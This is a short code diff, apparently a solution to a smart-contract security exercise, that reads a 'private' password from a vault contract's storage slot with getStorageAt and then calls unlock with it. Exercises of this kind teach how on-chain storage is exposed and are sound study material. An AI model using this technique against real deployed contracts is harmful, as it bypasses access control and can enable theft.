@@ -8,6 +8,10 @@ const helper = async (victim: any) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+
+    const password = await ethers.provider.getStorageAt(victim.address, 1);
+    console.log('password:', ethers.utils.parseBytes32String(password)) // decode bytes32 (doesn't work)
+    await victim.unlock(password);
 };
 
 export default helper;
